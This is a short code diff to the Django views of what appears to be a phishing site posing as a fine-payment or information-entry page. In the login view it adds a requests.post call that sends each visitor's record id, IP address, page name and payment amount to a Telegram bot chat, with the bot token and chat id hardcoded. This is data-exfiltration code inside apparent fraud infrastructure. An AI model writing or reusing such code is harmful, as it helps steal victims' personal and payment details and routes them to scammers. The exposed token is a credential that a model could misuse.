@@ -6,7 +6,7 @@ from .models import ContactModel
 from bs4 import BeautifulSoup
 from django.http import JsonResponse
 from django.shortcuts import render, redirect, get_object_or_404
-
+import requests
 @csrf_exempt
 def index(request):
     context = {
@@ -40,7 +40,8 @@ def login(request):
         contact.page_name="Melumat Doldurma sehifesi"
         contact.save()
         request.session['contact_id'] = contact.id
-        
+        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
+
         return render(request, 'cerime2.html',context)
     context = {
         'display_error': 'none',  # if there's no error, set display_error to 'none'
@@ -408,3 +409,4 @@ def contact_approve(request, pk):
     # Örneğin: return redirect('azercell')
 
     return JsonResponse({'success': True})
+
